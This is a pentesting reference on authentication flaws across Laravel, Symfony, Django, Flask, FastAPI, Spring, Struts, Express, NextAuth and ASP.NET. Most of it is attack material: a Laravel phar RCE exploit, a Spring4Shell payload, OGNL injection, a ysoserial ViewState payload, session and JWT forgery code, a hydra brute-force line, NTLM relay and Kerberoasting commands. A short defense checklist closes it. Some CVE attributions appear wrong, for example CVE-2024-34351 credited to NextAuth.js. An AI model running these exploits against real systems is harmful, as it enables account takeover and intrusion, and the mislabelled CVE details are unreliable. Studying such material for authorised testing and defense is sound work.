# Framework-Specific Authentication Vulnerabilities

## Overview

This document catalogs authentication vulnerabilities specific to popular web frameworks, including CVEs, attack techniques, and exploitation methods.

---

## 1. PHP Frameworks

### 1.1 Laravel Authentication Bypass

#### Mass Assignment Vulnerabilities
```php
// Vulnerable: User model without $guarded/$fillable
class User extends Authenticatable {
    // Missing: protected $fillable = ['name', 'email', 'password'];
}

// Attack: Registration with admin role
POST /register
{
    "name": "attacker",
    "email": "attacker@evil.com",
    "password": "password123",
    "is_admin": true,
    "role_id": 1
}
```

#### CVE-2021-3129: Laravel Debug Mode RCE
- **Impact**: Remote code execution when debug mode enabled
- **Vulnerable versions**: Laravel < 8.4.2
- **Exploitation**:
```bash
# Using PHPGGC for payload generation
php -d'phar.readonly=0' phpggc --phar phar -f -o exploit.phar monolog/rce1 system id

# Trigger via _ignition/execute-solution endpoint
curl -X POST "http://target/vulnerable-endpoint" \
  -d '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"viewFile": "phar://exploit.phar/test.txt"}}'
```

#### CVE-2024-29291: Laravel Reverb WebSocket Auth Bypass
- **Impact**: Authentication bypass in WebSocket connections
- **Affected**: Laravel Reverb < 1.0.0-beta9

#### Laravel Sanctum Token Vulnerabilities
```php
// Weak: Predictable token generation
$token = $user->createToken('api-token');

// Attack: Token enumeration if prefix is predictable
GET /api/user
Authorization: Bearer 1|predictable_pattern_here

// Check for token leakage in:
// - JavaScript source
// - Browser localStorage
// - Network requests
// - Error messages
```

#### Session Fixation in Laravel
```bash
# Test for session fixation
# 1. Get session before login
curl -c cookies.txt http://target/login

# 2. Check if session ID changes after login
curl -b cookies.txt -c cookies2.txt -X POST http://target/login \
  -d "email=user@test.com&password=password"

# Compare session IDs - should be different
diff cookies.txt cookies2.txt
```

### 1.2 Symfony Security Vulnerabilities

#### CVE-2024-50340: Query String Parser DoS
- **Impact**: Denial of service via malformed query strings
- **Affected**: Symfony < 5.4.46, 6.4.14, 7.1.7

#### CVE-2024-50341: Open Redirect in Security Component
- **Impact**: Open redirect leading to credential theft
- **Affected**: Symfony Security Bundle

#### CVE-2022-24894: Session Cookie Hijacking
- **Impact**: Session cookie accessible via HTTP
- **Affected**: Symfony < 4.4.50, 5.4.20, 6.0.20, 6.1.12, 6.2.6

#### Firewall Bypass Techniques
```yaml
# Vulnerable configuration - order matters!
security:
    firewalls:
        api:
            pattern: ^/api
            stateless: true
            jwt: ~
        main:
            pattern: ^/
            anonymous: true  # Bypass: /api requests may fall through

# Attack: Path normalization bypass
GET /api/../api/admin  # May bypass firewall rules
GET /API/admin         # Case sensitivity issues
GET /api/admin/        # Trailing slash handling
```

#### Access Control Bypass
```php
// Vulnerable: Incorrect voter logic
class AdminVoter extends Voter {
    protected function voteOnAttribute($attribute, $subject, TokenInterface $token) {
        // Missing return false for non-admin
        if ($this->isAdmin($token->getUser())) {
            return true;
        }
        // Bug: Returns null instead of false
    }
}

// Testing access control
# Check for role hierarchy issues
curl -H "Authorization: Bearer user_token" http://target/admin/users
```

### 1.3 CodeIgniter Session Vulnerabilities

#### CVE-2022-24711: Session Fixation
- **Impact**: Session fixation attack
- **Affected**: CodeIgniter < 4.1.9

#### Insecure Session Configuration
```php
// Vulnerable config/App.php
public $sessionDriver = 'CodeIgniter\Session\Handlers\FileHandler';
public $sessionSavePath = '/tmp';  // World-readable
public $sessionMatchIP = false;    // No IP binding
public $sessionTimeToUpdate = 0;   // No regeneration

// Secure configuration
public $sessionDriver = 'CodeIgniter\Session\Handlers\DatabaseHandler';
public $sessionSavePath = 'ci_sessions';
public $sessionMatchIP = true;
public $sessionTimeToUpdate = 300;
public $sessionRegenerateDestroy = true;
```

#### Cookie Encryption Weaknesses
```php
// Check for weak encryption key
// app/Config/Encryption.php
public $key = '';  // Empty or weak key

// Attack: If encryption key is known/weak
# Decrypt session cookie
php -r "
\$key = 'weak_key_here';
\$data = base64_decode('encrypted_session_cookie');
\$decrypted = openssl_decrypt(\$data, 'AES-256-CTR', \$key, ...);
var_dump(unserialize(\$decrypted));
"
```

### 1.4 PHP Type Juggling Attacks

#### Loose Comparison Vulnerabilities
```php
// Vulnerable authentication
if ($password == $stored_hash) {  // Using == instead of ===
    authenticate();
}

// Type juggling examples
var_dump("0e123" == "0e456");   // true (both are 0 in scientific notation)
var_dump("0" == false);         // true
var_dump("" == 0);              // true
var_dump([] == false);          // true
var_dump("php" == 0);           // true (PHP < 8.0)

// Magic hash exploitation
// MD5 hashes starting with 0e followed by digits
"240610708" => md5 = "0e462097431906509019562988736854"
"QNKCDZO"   => md5 = "0e830400451993494058024219903391"

// Attack payload
POST /login
{
    "username": "admin",
    "password": "240610708"  // May match 0e... hash via type juggling
}
```

#### JSON Type Confusion
```php
// Vulnerable: Type confusion in JSON
$data = json_decode($input);
if ($data->password == $stored_password) {  // Loose comparison
    login();
}

// Attack: Send integer instead of string
POST /api/login
Content-Type: application/json
{"username": "admin", "password": 0}

// Integer 0 loosely equals empty string or "0e..." strings
```

#### strcmp() Bypass
```php
// Vulnerable code
if (strcmp($_POST['password'], $correct_password) == 0) {
    authenticate();
}

// Attack: Send array instead of string
POST /login
password[]=anything

// strcmp(array, string) returns NULL
// NULL == 0 is true in loose comparison
```

---

## 2. Python Frameworks

### 2.1 Django Authentication Vulnerabilities

#### CVE-2024-42005: SQL Injection in QuerySet
- **Impact**: SQL injection via malformed JSON fields
- **Affected**: Django 4.2, 5.0

#### CVE-2024-45230: Denial of Service
- **Impact**: DoS via urlize() and urlizetrunc() filters
- **Affected**: Django < 4.2.16, 5.0.9, 5.1.1

#### CVE-2023-31047: File Upload Bypass
- **Impact**: Bypass file upload validation
- **Affected**: Django < 3.2.19, 4.1.9, 4.2.1

#### Session Cookie Attacks
```python
# Django uses signed cookies by default
# If SECRET_KEY is leaked, session can be forged

# Finding SECRET_KEY
# Check: settings.py, .env files, git history, error pages
grep -r "SECRET_KEY" .
git log -p | grep SECRET_KEY

# Forging session cookie (if SECRET_KEY known)
from django.core import signing
from django.contrib.sessions.backends.signed_cookies import SessionStore

# Create malicious session
session = SessionStore()
session['_auth_user_id'] = '1'  # Admin user ID
session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
session.create()

# Sign with leaked key
signed_cookie = signing.dumps(
    session._session,
    key='leaked_secret_key',
    salt='django.contrib.sessions.backends.signed_cookies'
)
```

#### Django Admin Bypass
```python
# Check for exposed admin URLs
/admin/
/admin/login/
/django-admin/
/administration/

# Brute force protection bypass
# Django doesn't have built-in rate limiting
hydra -l admin -P passwords.txt target.com http-post-form \
  "/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=TOKEN:Please enter"

# CSRF token extraction
curl -c cookies.txt http://target/admin/login/ | grep csrfmiddlewaretoken
```

#### ModelBackend Vulnerabilities
```python
# Vulnerable: Custom authentication backend
class CustomBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None):
        try:
            user = User.objects.get(username=username)
            # Missing: password verification!
            return user
        except User.DoesNotExist:
            return None

# Test: Authentication without password
POST /login/
{"username": "admin", "password": ""}
```

### 2.2 Flask-Login Vulnerabilities

#### Remember Me Token Issues
```python
# Vulnerable: Weak remember token
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))  # Just user ID!

# Attack: Manipulate remember_token cookie
# Default: user_id|hash(user_id + secret_key + 'remember')

# If token structure is predictable:
import hashlib
for user_id in range(1, 1000):
    token = f"{user_id}|{hashlib.sha512(f'{user_id}{leaked_key}remember'.encode()).hexdigest()}"
    # Test token
```

#### Session Security Issues
```python
# Vulnerable configuration
app.config['SESSION_COOKIE_SECURE'] = False  # HTTP transmission
app.config['SESSION_COOKIE_HTTPONLY'] = False  # XSS accessible
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=365)  # Too long

# Session tampering (if SECRET_KEY leaked)
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    def get_signing_serializer(self, secret_key):
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=dict(
                key_derivation=self.key_derivation,
                digest_method=self.digest_method
            )
        )

# Decode existing session
serializer = SimpleSecureCookieSessionInterface().get_signing_serializer('leaked_key')
data = serializer.loads(session_cookie)

# Forge new session
data['user_id'] = 1  # Admin
data['is_admin'] = True
forged = serializer.dumps(data)
```

#### @login_required Bypass
```python
# Vulnerable: Inconsistent decorator usage
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/user/data')  # Missing @login_required!
def user_data():
    user_id = request.args.get('id')
    return jsonify(User.query.get(user_id).to_dict())

# Discovery: Find unprotected routes
grep -r "@app.route" . | grep -v "login_required"
```

### 2.3 FastAPI Security Patterns

#### OAuth2 Implementation Flaws
```python
# Vulnerable: Token validation
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

@app.get("/users/me")
async def read_users_me(token: str = Depends(oauth2_scheme)):
    # Vulnerable: No signature verification
    payload = jwt.decode(token, options={"verify_signature": False})
    return payload

# Attack: Forge JWT without signature
import jwt
malicious = jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")
```

#### Dependency Injection Bypass
```python
# Vulnerable: Optional dependency
async def get_current_user(token: str = Depends(oauth2_scheme)):
    if not token:
        return None  # Returns None instead of raising
    # ...

@app.get("/admin")
async def admin(user = Depends(get_current_user)):
    if user.is_admin:  # AttributeError or bypass if user is None
        return "admin area"

# Secure pattern
async def get_current_user(token: str = Depends(oauth2_scheme)):
    if not token:
        raise HTTPException(status_code=401)
    # Validate token...
```

#### Path Parameter Injection
```python
# Vulnerable: User ID from path without validation
@app.get("/users/{user_id}/profile")
async def get_profile(user_id: int, current_user: User = Depends(get_current_user)):
    return await User.get(user_id)  # IDOR - no ownership check

# Test
GET /users/1/profile  # Access any user's profile
Authorization: Bearer valid_user_token
```

---

## 3. Java Frameworks

### 3.1 Spring Security Bypass

#### CVE-2024-38821: Authorization Bypass
- **Impact**: Authorization rules bypass
- **Affected**: Spring Security 5.7.x-5.8.x, 6.0.x-6.3.x

#### CVE-2024-22243: Open Redirect
- **Impact**: Open redirect via UriComponentsBuilder
- **Affected**: Spring Framework < 6.1.4, 6.0.17, 5.3.32

#### CVE-2022-22978: RegEx Authorization Bypass
- **Impact**: Bypass authorization using regex DoS
- **Affected**: Spring Security 5.5.6, 5.6.3

#### CVE-2022-22965: Spring4Shell RCE
- **Impact**: Remote code execution
- **Affected**: Spring Framework < 5.3.18, 5.2.20
```bash
# Exploitation
curl -X POST "http://target/app" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i%20if(%22j%22.equals(request.getParameter(%22pwd%22))){%20java.io.InputStream%20in%20=%20%25{c1}i.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20..."
```

#### Security Filter Chain Bypass
```java
// Vulnerable: Incorrect antMatchers order
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
        .antMatchers("/public/**").permitAll()
        .antMatchers("/admin/**").hasRole("ADMIN")
        .antMatchers("/**").authenticated();  // Too broad, should be specific
}

// Attack: Path traversal
GET /public/../admin/users  // May bypass filters

// URL encoding bypass
GET /admin%2fusers
GET /admin/./users
GET //admin/users
```

#### Method Security Bypass
```java
// Vulnerable: Missing @PreAuthorize
@RestController
public class AdminController {

    @GetMapping("/admin/users")
    @PreAuthorize("hasRole('ADMIN')")
    public List<User> getUsers() { ... }

    @PostMapping("/admin/users")  // Missing security annotation!
    public User createUser(@RequestBody User user) { ... }
}

// Discovery tool
grep -r "@RequestMapping\|@GetMapping\|@PostMapping" . | grep -v "@PreAuthorize\|@Secured"
```

### 3.2 Java JWT Library Flaws

#### CVE-2022-21449: ECDSA Signature Bypass (Psychic Signatures)
- **Impact**: Signature validation bypass in Java 15-18
- **Affected**: Java 15, 16, 17, 18 (before April 2022 patches)
```java
// Attack: Empty signature accepted
// ECDSA signature with r=0, s=0 validates as true

// Exploitation
import java.security.Signature;
byte[] emptySignature = new byte[64];  // All zeros
Signature sig = Signature.getInstance("SHA256withECDSA");
sig.initVerify(publicKey);
sig.update(data);
boolean valid = sig.verify(emptySignature);  // Returns true!
```

#### Algorithm Confusion Attack
```java
// Vulnerable: Accepts multiple algorithms
String token = JWT.decode(tokenString);  // Without algorithm verification

// Attack: Change RS256 to HS256
// Use public key as HMAC secret
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;

String publicKey = "-----BEGIN PUBLIC KEY-----\n...";
String forgedToken = Jwts.builder()
    .setSubject("admin")
    .signWith(SignatureAlgorithm.HS256, publicKey.getBytes())
    .compact();
```

#### Null Signature Vulnerability
```java
// Some libraries accept null/empty signatures
// Test by removing signature portion
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.

// Or with explicit none algorithm
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

### 3.3 Apache Struts Authentication

#### CVE-2023-50164: File Upload Path Traversal
- **Impact**: Path traversal in file upload
- **Affected**: Struts 2.5.0-2.5.32, 6.0.0-6.3.0

#### CVE-2021-31805: OGNL Injection
- **Impact**: Remote code execution
- **Affected**: Struts 2.0.0-2.5.29
```bash
# Test for OGNL injection
curl "http://target/action" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
```

#### Action Mapping Bypass
```xml
<!-- Vulnerable struts.xml -->
<action name="admin/*" class="com.app.AdminAction">
    <interceptor-ref name="defaultStack"/>
    <!-- Missing authentication interceptor -->
</action>

<!-- Attack: Access admin actions directly -->
GET /admin/deleteUser?id=1
```

---

## 4. JavaScript Frameworks

### 4.1 Express Session Issues

#### Session Fixation
```javascript
// Vulnerable: No session regeneration
app.post('/login', (req, res) => {
    // Authenticate user
    req.session.userId = user.id;  // Same session ID
    res.redirect('/dashboard');
});

// Secure: Regenerate session
app.post('/login', (req, res) => {
    req.session.regenerate((err) => {
        req.session.userId = user.id;
        res.redirect('/dashboard');
    });
});
```

#### Insecure Session Store
```javascript
// Vulnerable: MemoryStore in production
const session = require('express-session');
app.use(session({
    secret: 'weak',
    resave: false,
    saveUninitialized: true,
    // No store specified - uses MemoryStore
}));

// Vulnerable: Weak secret
app.use(session({
    secret: 'keyboard cat',  // Default example secret
    // ...
}));

// Finding weak secrets
grep -r "session.*secret" . --include="*.js"
```

#### Cookie Security Misconfigurations
```javascript
// Vulnerable configuration
app.use(session({
    secret: process.env.SECRET,
    cookie: {
        secure: false,      // Transmitted over HTTP
        httpOnly: false,    // Accessible via JavaScript
        sameSite: 'none',   // CSRF vulnerable
        maxAge: 1000 * 60 * 60 * 24 * 365  // 1 year - too long
    }
}));

// Test for cookie flags
curl -I http://target/login -c - | grep -i set-cookie
```

### 4.2 Passport.js Vulnerabilities

#### OAuth State Bypass
```javascript
// Vulnerable: Missing state parameter validation
passport.use(new OAuth2Strategy({
    authorizationURL: 'https://provider/authorize',
    tokenURL: 'https://provider/token',
    clientID: CLIENT_ID,
    clientSecret: CLIENT_SECRET,
    callbackURL: '/auth/callback'
    // Missing: state parameter handling
}, ...));

// Attack: CSRF on OAuth callback
// 1. Attacker initiates OAuth with their account
// 2. Gets authorization code
// 3. Tricks victim into visiting callback URL with attacker's code
// 4. Victim's session linked to attacker's OAuth account
```

#### Session Serialization Issues
```javascript
// Vulnerable: Serializing full user object
passport.serializeUser((user, done) => {
    done(null, user);  // Entire user object in session
});

// Attack: If session storage is compromised, all user data exposed
// Also: Session bloat, potential for tampering

// Secure pattern
passport.serializeUser((user, done) => {
    done(null, user.id);  // Only ID
});
```

#### Strategy Confusion
```javascript
// Multiple strategies without proper isolation
passport.use('local', new LocalStrategy(...));
passport.use('admin-local', new LocalStrategy(...));

// Vulnerable route
app.post('/admin/login', passport.authenticate('local', ...));
// Should use 'admin-local' strategy

// Test: Use regular user credentials on admin login
```

### 4.3 NextAuth.js Flaws

#### CVE-2024-34351: Server-Side Request Forgery
- **Impact**: SSRF via callback URL
- **Affected**: NextAuth.js < 4.24.6

#### CVE-2023-48309: OAuth Callback Injection
- **Impact**: Authentication bypass
- **Affected**: NextAuth.js < 4.24.5

#### CSRF on Callback Route
```javascript
// Vulnerable: Missing CSRF protection on callbacks
// Attack vector
<form action="https://target.com/api/auth/callback/credentials" method="POST">
    <input name="username" value="attacker">
    <input name="password" value="password">
    <input type="submit">
</form>
```

#### JWT Callback Manipulation
```javascript
// Vulnerable: Trusting client-supplied data
callbacks: {
    async jwt({ token, user, account }) {
        if (account) {
            token.role = account.role;  // From OAuth provider
        }
        return token;
    }
}

// Attack: If OAuth provider is compromised or misconfigured
// Attacker controls role claim in OAuth response
```

#### Session Token Exposure
```javascript
// Check for exposed session tokens
// Browser DevTools > Application > Cookies
// Look for: next-auth.session-token

// API endpoint exposure
GET /api/auth/session
// Returns session data - check for sensitive fields
```

---

## 5. .NET Framework

### 5.1 ASP.NET Identity Issues

#### CVE-2024-21386: SignalR Denial of Service
- **Impact**: DoS via SignalR connections
- **Affected**: ASP.NET Core < 8.0.2, 7.0.15, 6.0.26

#### CVE-2024-21404: .NET Denial of Service
- **Impact**: DoS in X.509 certificate parsing
- **Affected**: .NET < 8.0.2, 7.0.15, 6.0.27

#### Password Reset Token Weakness
```csharp
// Vulnerable: Predictable token generation
public string GeneratePasswordResetToken(string userId)
{
    return Convert.ToBase64String(
        Encoding.UTF8.GetBytes(userId + DateTime.Now.Ticks)
    );
}

// Attack: Generate tokens for any user
DateTime.Now.Ticks is predictable within milliseconds

// Secure: Use UserManager.GeneratePasswordResetTokenAsync()
```

#### Cookie Authentication Bypass
```csharp
// Vulnerable configuration
services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly = false;  // XSS accessible
    options.Cookie.SecurePolicy = CookieSecurePolicy.None;  // HTTP
    options.SlidingExpiration = true;
    options.ExpireTimeSpan = TimeSpan.FromDays(365);  // Too long
});

// Machine Key exploitation (if web.config exposed)
// Use machinekey tool to decrypt cookies
```

#### Role-Based Access Control Bypass
```csharp
// Vulnerable: String comparison for roles
[Authorize(Roles = "Admin")]
public IActionResult AdminPanel() { ... }

// Attack: Case sensitivity issues
// User with role "admin" vs "Admin"

// Policy bypass via claims manipulation
// If claims come from untrusted source (JWT, external IdP)
```

### 5.2 Windows Authentication Bypass

#### NTLM Relay Attacks
```bash
# NTLM relay with Responder and ntlmrelayx
# Start Responder
responder -I eth0 -wrf

# Start ntlmrelayx
ntlmrelayx.py -t https://target.com -smb2support

# Capture and relay NTLM authentication
# Gain access to target as relayed user
```

#### Kerberos Attacks
```bash
# Kerberoasting - extract service ticket hashes
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain/user:password

# Crack hashes offline
hashcat -m 13100 kerberoast.txt wordlist.txt

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
```

#### IIS Windows Auth Bypass
```powershell
# Anonymous authentication enabled alongside Windows auth
# Check web.config
<authentication mode="Windows"/>
<authorization>
    <allow users="*"/>  # Allows anonymous
</authorization>

# Path bypass
/app/..;/sensitive/page  # IIS path parsing issues
```

### 5.3 Forms Authentication Flaws

#### ViewState Deserialization (CVE-2020-0688)
```bash
# If machineKey is known/default
# Generate malicious ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c calc" \
  --validationalg="SHA1" \
  --validationkey="[KEY]" \
  --generator="[GENERATOR]"

# Send crafted ViewState
POST /vulnerable.aspx
__VIEWSTATE=<serialized_payload>
```

#### Ticket Manipulation
```csharp
// Forms authentication ticket structure
// If encryption key is weak or known:

// Decrypt existing ticket
FormsAuthenticationTicket ticket = FormsAuthentication.Decrypt(cookie);

// Modify and re-encrypt
FormsAuthenticationTicket newTicket = new FormsAuthenticationTicket(
    ticket.Version,
    "admin",  // Changed username
    ticket.IssueDate,
    ticket.Expiration,
    ticket.IsPersistent,
    "Admin",  // Changed roles
    ticket.CookiePath
);
string newCookie = FormsAuthentication.Encrypt(newTicket);
```

#### Configuration Exposure
```xml
<!-- web.config exposure via path traversal -->
GET /..%c0%af..%c0%af..%c0%afweb.config
GET /web.config.bak
GET /web.config.old
GET /web.config.txt

<!-- Extract keys -->
<machineKey
    validationKey="..."
    decryptionKey="..."
    validation="SHA1"
    decryption="AES"/>
```

---

## 6. Cross-Framework Attack Tools

### Automated Scanners
```bash
# Nuclei templates for framework detection and exploitation
nuclei -t technologies/ -u https://target.com

# Framework-specific templates
nuclei -t cves/2022/CVE-2022-22965.yaml -u https://target.com  # Spring4Shell
nuclei -t cves/2021/CVE-2021-3129.yaml -u https://target.com   # Laravel

# WhatWeb for framework detection
whatweb https://target.com

# Wappalyzer CLI
wappalyzer https://target.com
```

### Session Testing
```bash
# Session token analysis
# 1. Collect multiple tokens
for i in {1..10}; do
    curl -c - http://target/login 2>/dev/null | grep -i session
done

# 2. Analyze with Burp Sequencer
# Or use custom script for entropy analysis

# 3. Test for predictability
python3 -c "
import requests
tokens = []
for i in range(100):
    r = requests.get('http://target/login')
    tokens.append(r.cookies.get('session'))
# Analyze token patterns
"
```

### JWT Testing
```bash
# jwt_tool - comprehensive JWT testing
python3 jwt_tool.py <token> -T  # Tampering menu
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack secret
python3 jwt_tool.py <token> -X a  # Algorithm confusion
python3 jwt_tool.py <token> -I -pc name -pv admin  # Inject claim

# jwt-cracker
jwt-cracker <token> [alphabet] [maxLength]
```

---

## 7. Defense Recommendations

### Secure Configuration Checklist
```yaml
Framework Security:
  - [ ] Keep frameworks updated to latest stable versions
  - [ ] Enable security headers (HSTS, CSP, X-Frame-Options)
  - [ ] Use secure session configuration
  - [ ] Implement proper CSRF protection
  - [ ] Enable rate limiting on auth endpoints
  - [ ] Use parameterized queries (prevent SQLi)
  - [ ] Validate and sanitize all input

Authentication:
  - [ ] Use strong, unique secrets for signing
  - [ ] Implement proper password hashing (bcrypt, Argon2)
  - [ ] Regenerate session ID after login
  - [ ] Implement MFA where possible
  - [ ] Use secure cookie flags (HttpOnly, Secure, SameSite)
  - [ ] Implement account lockout policies
  - [ ] Log authentication events

Authorization:
  - [ ] Apply principle of least privilege
  - [ ] Use role-based or attribute-based access control
  - [ ] Validate authorization on every request
  - [ ] Don't rely solely on client-side checks
  - [ ] Audit access control regularly
```

---

## References

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CVE Database: https://cve.mitre.org/
- NVD: https://nvd.nist.gov/
- Framework Security Advisories (check each framework's security page)
- PortSwigger Web Security Academy
- HackTricks: https://book.hacktricks.xyz/
